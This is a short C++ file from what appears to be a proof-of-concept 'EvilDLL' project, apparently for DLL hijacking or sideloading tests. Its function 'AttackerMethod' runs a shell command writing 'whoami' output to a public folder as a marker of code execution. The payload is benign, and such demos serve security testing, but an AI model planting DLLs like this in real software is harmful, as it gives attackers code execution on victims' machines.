#include "pch.h"
#include "EvilDLL.h"

DWORD AttackerMethod(DWORD a, LPCWSTR b, LPCWSTR c, DWORD e, DWORD f)
{
	system("whoami > C:\\Users\\Public\\remote_info.txt");
	return 0;
}

DWORD TestMethod()
{
	std::cout << "Hello from TestMethod!" << std::endl;
	return 0;
}